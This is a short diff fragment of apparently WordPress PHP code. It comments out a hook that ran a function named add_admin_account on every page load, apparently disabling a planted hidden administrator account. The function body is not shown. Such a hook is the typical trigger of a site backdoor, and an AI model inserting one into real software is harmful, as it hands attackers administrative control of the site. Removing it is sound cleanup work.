@@ -15,4 +15,4 @@ function add_admin_account(){
     //die();
 }
 
-add_action('init','add_admin_account');
+// add_action('init','add_admin_account');
